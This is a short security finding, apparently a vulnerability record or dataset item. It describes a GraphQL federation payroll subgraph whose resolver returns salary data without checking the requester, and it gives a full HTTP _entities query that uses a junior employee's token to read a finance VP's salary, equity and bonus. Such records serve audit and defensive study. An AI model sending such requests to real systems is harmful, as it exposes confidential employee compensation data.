diagnosis: The EmployeeSalaryRecord subgraph resolver resolves compensation data by employeeId without inspecting context.requester. Any employee within the federated corporate portal can issue GraphQL entity queries with arbitrary employee IDs to discover executive salaries, bonus targets, and equity grants.
exploit_request:
POST /subgraphs/payroll HTTP/1.1
Host: hr-mesh.enterprise.com
Authorization: Bearer <junior_dev_token>
Content-Type: application/json

{"query": "query { _entities(representations: [{ __typename: \"EmployeeSalaryRecord\", employeeId: \"emp_vp_finance_01\" }]) { ... on EmployeeSalaryRecord { baseSalary equityUnits bonusTargetPct } } }"}
